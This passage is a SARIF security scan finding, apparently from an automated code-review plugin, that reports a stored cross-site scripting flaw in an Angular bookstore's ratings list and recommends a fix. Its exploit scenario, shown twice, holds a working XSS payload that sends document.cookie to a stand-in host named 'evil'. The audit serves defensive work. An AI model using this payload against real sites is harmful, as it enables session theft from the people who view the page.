      "results": [
        {
          "ruleId": "CWE-79",
          "ruleIndex": 0,
          "level": "warning",
          "message": {
            "text": "Stored XSS: buyer-supplied rating comment rendered via innerHTML after bypassSecurityTrustHtml.\n\nThe rating comment comes from any buyer, through the create/update rating forms or straight from the unauthenticated ratings API (POST/PUT /api/v1/ratings, CORS *), and is stored unchanged. It comes back from GET /api/v1/ratings and is marked trusted with bypassSecurityTrustHtml before being bound to [innerHTML], which turns off Angular's built-in HTML sanitizer.\n\nImpact: Persistent script execution in the storefront/admin SPA origin for everyone who views the ratings list. This allows session/cookie theft, actions taken as the victim (deleting books, changing config through the ingest settings screens), and page defacement.\n\nExploit scenario: The attacker sends PUT /api/v1/ratings/1 with body {\"id\":1,\"email\":\"x\",\"isbn\":\"y\",\"rating\":5,\"comment\":\"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}. A POST with any valid email/ISBN, or the Create Rating form, also works. Store staff open /ratings, which the UI says is where comments are read ('Only Quillmark sees your comment'), and the onerror handler runs in the web app's origin. From there it can call every BookStore API as the victim and change the page.\n\nPreconditions: Attacker can submit or change a rating comment (the ratings API needs no authentication); A victim opens the /ratings list view.\n\nRecommendation: Remove the bypassSecurityTrustHtml call. Render the comment with {{ }} interpolation, or bind the plain string to [innerHTML] so Angular's sanitizer runs. If rich formatting is truly needed, sanitize it with a strict allow-list (e.g. DOMPurify) and also validate or encode it on the server.\n\nCWE-79. Severity MEDIUM, confidence high."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "web/src/app/ratings/rating-list/rating-list.component.ts",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 26,
                  "snippet": {
                    "text": "    return this.sanitizer.bypassSecurityTrustHtml(rating.comment ?? '');"
                  }
                }
              },
              "logicalLocations": [
                {
                  "name": "RatingListComponent.commentHtml",
                  "fullyQualifiedName": "RatingListComponent.commentHtml"
                }
              ]
            }
          ],
          "properties": {
            "claudeSecurityPlugin": {
              "id": "F1",
              "title": "Stored XSS: buyer-supplied rating comment rendered via innerHTML after bypassSecurityTrustHtml",
              "impact": "Persistent script execution in the storefront/admin SPA origin for everyone who views the ratings list. This allows session/cookie theft, actions taken as the victim (deleting books, changing config through the ingest settings screens), and page defacement.",
              "file": "web/src/app/ratings/rating-list/rating-list.component.ts",
              "line": 26,
              "description": "The rating comment comes from any buyer, through the create/update rating forms or straight from the unauthenticated ratings API (POST/PUT /api/v1/ratings, CORS *), and is stored unchanged. It comes back from GET /api/v1/ratings and is marked trusted with bypassSecurityTrustHtml before being bound to [innerHTML], which turns off Angular's built-in HTML sanitizer.",
              "exploit_scenario": "The attacker sends PUT /api/v1/ratings/1 with body {\"id\":1,\"email\":\"x\",\"isbn\":\"y\",\"rating\":5,\"comment\":\"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}. A POST with any valid email/ISBN, or the Create Rating form, also works. Store staff open /ratings, which the UI says is where comments are read ('Only Quillmark sees your comment'), and the onerror handler runs in the web app's origin. From there it can call every BookStore API as the victim and change the page.",
              "preconditions": [
                "Attacker can submit or change a rating comment (the ratings API needs no authentication)",
                "A victim opens the /ratings list view"
              ],
              "category": "Cross-site Scripting",
              "severity": "MEDIUM",
              "confidence": "high",
              "recommendation": "Remove the bypassSecurityTrustHtml call. Render the comment with {{ }} interpolation, or bind the plain string to [innerHTML] so Angular's sanitizer runs. If rich formatting is truly needed, sanitize it with a strict allow-list (e.g. DOMPurify) and also validate or encode it on the server.",
              "cwe_id": "CWE-79",
              "snippet": "    return this.sanitizer.bypassSecurityTrustHtml(rating.comment ?? '');",
              "symbol": "RatingListComponent.commentHtml",
              "declared_line": 26,
              "via_change": "web/src/app/ratings/rating-list/rating-list.component.html:19 swaps the comment cell's text interpolation for an [innerHTML] binding to commentHtml(rating). That method, added in the same change, wraps the raw comment in bypassSecurityTrustHtml, so stored comment markup now runs as live DOM.",
              "other_cwe_ids": [],
              "claudeSecurityPluginFindingId": "v3:5c22a9c9a3b17b5601c480e5d881088d139ab93bc58080ec7c6bd0e09812a6af",
              "verification": {
